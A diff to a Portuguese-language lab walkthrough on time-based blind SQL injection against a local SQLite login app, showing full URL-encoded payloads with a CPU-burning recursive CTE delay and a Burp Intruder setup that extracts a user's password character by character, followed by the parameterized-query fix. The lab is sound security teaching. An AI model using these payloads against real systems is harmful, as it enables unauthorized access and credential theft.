@@ -40,7 +40,7 @@ Este átomo é trabalhado inteiramente no Burp Suite (Proxy → Repeater → Int
 
 O form de login em `/` dispara um `POST /login` com body form-encoded `username=<...>&password=<...>`. Monte esse request numa nova aba do Repeater apontando pra `127.0.0.1:8007` e mande uma vez com as credenciais do seed (`username=alice&password=wonderland`): a resposta volta instantânea com `Login attempt processed.`. Repare no tempo de resposta — o Burp mostra ele no rodapé do painel Response, alguns milissegundos. Essa resposta rápida e uniforme é o seu baseline. Cada passo abaixo edita o body e reenvia, e a única coisa que você observa é **quanto a resposta demora**.
 
-> **Convenção de notação.** Uma letra maiúscula isolada num payload (`N`, `P`, `C`) é um *placeholder de leitura* — substitua por um valor concreto antes de enviar. `K` é diferente: é uma constante fixa, pré-calibrada, embutida na expressão de delay (veja abaixo), a mesma em toda request.
+> **Convenção de notação.** `N`, `P` e `C` nomeiam os valores que você varre — um comprimento candidato, uma posição de caractere, um caractere candidato. Cada payload abaixo já vem com eles preenchidos com um valor concreto (ex.: `N = 10`); pra varrer, você edita só aquele número ou letra e reenvia (não cole um `N`/`P`/`C` literal). A expressão de delay é o oposto: aparece **por extenso em todo payload**, byte a byte idêntica toda vez, sem nada dentro pra substituir — `K`, o `18000` dela, é aquela constante fixa, pré-calibrada, que você não varia.
 
 ### Uma nota sobre encoding do body
 
@@ -57,10 +57,10 @@ Time-based blind SQLi precisa de um jeito de fazer o banco queimar tempo *sob de
 A primitiva usada aqui é um recursive CTE pequeno, cross-joined consigo mesmo:
 
 ```
-E = (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b)
+(WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b)
 ```
 
-O CTE constrói uma tabelinha `t` de `K = 18000` linhas, e então `count(*) FROM t a, t b` conta os `K²` ≈ 324 milhões de pares do cross join. Contar esses pares é trabalho puro de CPU e leva alguns segundos, mas a memória fica estável: a única coisa materializada é a tabela de `K` linhas (dezenas de KB), nunca os `K²` pares. `K = 18000` foi calibrado contra o container deste lab (SQLite 3.46.1) pra cair em torno de **3–4 segundos** por execução; o número exato é CPU-dependente, então se os seus delays voltarem bem mais curtos ou longos, ajuste `K` (o tempo cresce com `K²`, então mudanças pequenas movem bastante). O que importa nunca é o número absoluto — é o *contraste* entre segundos e milissegundos.
+O CTE constrói uma tabelinha `t` de `K = 18000` linhas, e então `count(*) FROM t a, t b` conta os `K²` ≈ 324 milhões de pares do cross join. Contar esses pares é trabalho puro de CPU e leva alguns segundos, mas a memória fica estável: a única coisa materializada é a tabela de `K` linhas (dezenas de KB), nunca os `K²` pares. `K = 18000` foi calibrado contra o container deste lab (SQLite 3.46.1) pra cair em torno de **3–4 segundos** por execução; o número exato é CPU-dependente, então se os seus delays voltarem bem mais curtos ou longos, ajuste `K` (o tempo cresce com `K²`, então mudanças pequenas movem bastante). O que importa nunca é o número absoluto — é o *contraste* entre segundos e milissegundos. Você vai ver esse bloco exato, por extenso, dentro de todo payload abaixo — ele nunca é abreviado.
 
 ### Step 1 — Provar a injeção *e* descobrir o único canal
 
@@ -117,21 +117,21 @@ Qualquer pergunta de sim/não que você consiga expressar em SQL pode agora ser 
 
 ### Step 3 — Extrair o comprimento da senha por timing
 
-Troque a condição placeholder por uma sobre dado real: o comprimento da senha da alice é igual a `N`?
+Troque a condição placeholder por uma sobre dado real: o comprimento da senha da alice é igual a `N`? Comece com um probe concreto que pergunta se o comprimento é 10.
 
-Body (decoded, `N` é o comprimento candidato):
+Body (decoded):
 
 ```
-username=alice' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='alice') = N) THEN <E> ELSE 1 END) -- &password=x
+username=alice' AND (SELECT CASE WHEN ((SELECT LENGTH(password) FROM users WHERE username='alice') = 10) THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
 ```
 
-Onde `<E>` é a expressão de delay de cima. Burp-ready concreto para `N = 10`:
+Body (Burp-ready):
 
 ```
 username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20((SELECT%20LENGTH(password)%20FROM%20users%20WHERE%20username%3D%27alice%27)%20%3D%2010)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
 ```
 
-Itere `N` no mesmo lugar (edita só o número) e cronometre cada resposta:
+Itere o número no mesmo lugar (no Repeater, edite só o `10`) e cronometre cada resposta:
 
 - `... = 5)  ...` → instantâneo (o comprimento não é 5)
 - `... = 10) ...` → **delay de ~3–4 segundos** (o comprimento é 10)
@@ -141,21 +141,21 @@ Conclusão: a senha da alice tem **10 caracteres**. Você descobriu um fato sobr
 
 ### Step 4 — Extrair um caractere por timing
 
-Pergunta mais fina: o caractere na posição `P` é igual ao candidato `C`? `SUBSTR(password, P, 1)` extrai um caractere; a comparação transforma ele no único bit que o cronômetro revela.
+Pergunta mais fina: o caractere na posição `P` é igual ao candidato `C`? `SUBSTR(password, P, 1)` extrai um caractere; a comparação transforma ele no único bit que o cronômetro revela. Comece testando o primeiro caractere (`P = 1`) contra o candidato `w`.
 
-Body (decoded, `P` = posição, `C` = caractere candidato):
+Body (decoded):
 
 ```
-username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),P,1) = 'C') THEN <E> ELSE 1 END) -- &password=x
+username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),1,1) = 'w') THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
 ```
 
-Burp-ready concreto para `P = 1`, `C = w`:
+Body (Burp-ready):
 
 ```
 username=alice%27%20AND%20(SELECT%20CASE%20WHEN%20(SUBSTR((SELECT%20password%20FROM%20users%20WHERE%20username%3D%27alice%27),1,1)%20%3D%20%27w%27)%20THEN%20(WITH%20RECURSIVE%20t(x)%20AS%20(SELECT%201%20UNION%20ALL%20SELECT%20x%2B1%20FROM%20t%20WHERE%20x%20<%2018000)%20SELECT%20count(*)%20FROM%20t%20a,%20t%20b)%20ELSE%201%20END)%20--%20&password=x
 ```
 
-Na mão, no primeiro caractere: `C = 'a'` → instantâneo (não é `a`); `C = 'w'` → **delay de ~3–4 segundos** (o primeiro caractere é `w`).
+Na mão, no primeiro caractere: como enviado acima, o candidato `'w'` faz a resposta travar **~3–4 segundos** — então o primeiro caractere é `w`. Troque por qualquer outra letra (`'a'`, `'b'`, …) e a resposta volta instantânea.
 
 Os dois argumentos numéricos do `SUBSTR` têm papéis distintos, e a distinção importa pro próximo passo. O primeiro (`1`) é a *posição* — qual caractere ler, o que você varia pra varrer a senha inteira. O segundo (`1`) é o *tamanho* — quantos caracteres ler, sempre 1.
 
@@ -166,15 +166,15 @@ Os dois argumentos numéricos do `SUBSTR` têm papéis distintos, e a distinçã
 Request base (o payload que funcionou no Step 4), com as duas payload positions marcadas com `§...§`:
 
 ```
-username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§') THEN <E> ELSE 1 END) -- &password=x
+username=alice' AND (SELECT CASE WHEN (SUBSTR((SELECT password FROM users WHERE username='alice'),§1§,1) = '§w§') THEN (WITH RECURSIVE t(x) AS (SELECT 1 UNION ALL SELECT x+1 FROM t WHERE x < 18000) SELECT count(*) FROM t a, t b) ELSE 1 END) -- &password=x
 ```
 
 (Os nomes de menu abaixo são do Burp Community Edition; no Pro são idênticos.)
 
-1. **Send to Intruder.** Clique com o botão direito no request que funcionou no Repeater → **Send to Intruder**, e vá pra aba Intruder. Garanta que o body ainda tem `x%2B1` dentro do `<E>` — o Intruder manda o texto estático do request base como está, então um `+` cru aqui decodaria pra espaço e quebraria o burn igual no Repeater.
+1. **Send to Intruder.** Clique com o botão direito no request que funcionou no Repeater → **Send to Intruder**, e vá pra aba Intruder. Garanta que o body ainda tem `x%2B1` dentro da expressão de delay — o Intruder manda o texto estático do request base como está, então um `+` cru aqui decodaria pra espaço e quebraria o burn igual no Repeater.
 2. **Marque duas payload positions** com `§...§`: o argumento de **posição** do `SUBSTR` (o primeiro `1`, varia `1` → `10`) e o caractere **candidato** (o `w`, varia `a` → `z`). **Não** marque o `1` do argumento de *tamanho* do `SUBSTR`, nem nenhum dígito do `18000` da expressão de delay — há vários dígitos literais no payload, e marcar o errado quebra o ataque.
 3. **Attack type:** `Cluster bomb` — o produto cartesiano dos dois payload sets, toda posição combinada com todo candidato.
-4. **Payload set 1 (a posição):** `Numbers`, de `1` a `10`, step `1`. (10 payloads.)
+4. **Payload set 1 (a posição):** `Numbers`, **From `1`, To `10`, Step `1`** — 10 payloads. **Comece em `1`, não em `0`.** O SQLite indexa strings a partir de 1: `SUBSTR(password, 1, 1)` é o primeiro caractere, enquanto `SUBSTR(password, 0, 1)` retorna string vazia, que nunca casa com nenhuma letra candidata. Um range que começa em `0` faz, então, aquela posição voltar *rápida* pra toda letra — sem hit, sem erro pra te dizer por quê, e o ataque só parece quebrado. O range tem que ser `1`–`10`.
 5. **Payload set 2 (o candidato):** `Simple list`, as 26 letras minúsculas, uma por linha. (Não use `Brute forcer` — ele explode em 26ⁿ.) Request count: **260** (10 × 26).
 6. **Defina o oráculo como tempo, e serialize o ataque.** Esta é a única diferença em relação ao `sqli-blind-boolean`. Não há Grep — Match pra adicionar, porque as 260 responses são idênticas. Em vez disso leia a coluna **`Response received`** (tempo até o primeiro byte, em milissegundos; `Response completed` também serve) — habilite ela no menu de colunas da tabela de resultados se não estiver visível. E abra o **Resource pool** e ponha **Maximum concurrent requests = 1**: os payloads queimam CPU, e vários rodando ao mesmo tempo competiriam por ela e sujariam o sinal de tempo. Um por vez deixa cada medição limpa. (O Burp Community também dá throttle no Intruder, o que só adiciona um offset constante a toda request — o gap de segundos-vs-milissegundos fica intacto.)
 7. **Start attack.** Ordene os resultados pela coluna `Response received`, decrescente. **10 linhas se destacam em ~3–4 segundos**, uma por posição; as outras 250 voltam em milissegundos. Leia as linhas lentas em ordem de posição: `w, o, n, d, e, r, l, a, n, d` → `wonderland`.
@@ -193,4 +193,4 @@ No `sqli-union-basic` o dado vinha no body, direto. No `sqli-blind-boolean` o bo
 
 Veja [`DIFF.pt-BR.md`](./DIFF.pt-BR.md) pra a mudança. Em resumo: a versão fixed chama `conn.execute("... WHERE username = ? AND password = ?", (username, password))`. Com placeholders, o driver do SQLite faz o parse do statement primeiro — sem o input — e só depois liga cada valor como dado literal. O payload de timing inteiro, cross join e tudo, chega como o *value* de `username`; nunca é parseado como SQL e nunca executa.
 
-Rode qualquer payload da seção 3 contra <http://127.0.0.1:8107/login>. Todos retornam `Login attempt processed.` **instantaneamente** — inclusive o probe incondicional do Step 1, que contra a app vulnerable travava por segundos. A mensagem uniforme não mudou; aquela resposta achatada era anti-enumeration legítimo, nunca foi o bug. O que o atacante perdeu foi a capacidade de injetar qualquer coisa em que a engine vá gastar tempo. Sem delay controlável, o canal de timing some — do mesmo jeito que o fix parametrizado fechou o canal de body no `sqli-union-basic` e o canal boolean no `sqli-blind-boolean`. Uma root cause, um fix, três exploits.
+Aponte o Repeater pra app fixed na porta **8107** e reenvie qualquer payload da seção 3 — mas atenção a uma pegadinha do Burp antes. Editar a porta no texto do request **não** muda pra onde a request vai: o Repeater envia pro destino que está no campo **Target** (o controle logo acima do editor do request, mostrando algo como `http://127.0.0.1:8007`), e o host/porta que você vê dentro das linhas do request é só texto. Clique nesse controle **Target** e mude a porta pra **8107** ali. Se você editar só o body do request ou a linha `Host`, a request continua indo pra app vulnerable na 8007, o delay ainda dispara, e o fix parece não funcionar. Com o Target de fato apontando pra 8107, todo payload retorna `Login attempt processed.` **instantaneamente** — inclusive o probe incondicional do Step 1, que contra a app vulnerable travava por segundos. A mensagem uniforme não mudou; aquela resposta achatada era anti-enumeration legítimo, nunca foi o bug. O que o atacante perdeu foi a capacidade de injetar qualquer coisa em que a engine vá gastar tempo. Sem delay controlável, o canal de timing some — do mesmo jeito que o fix parametrizado fechou o canal de body no `sqli-union-basic` e o canal boolean no `sqli-blind-boolean`. Uma root cause, um fix, três exploits.
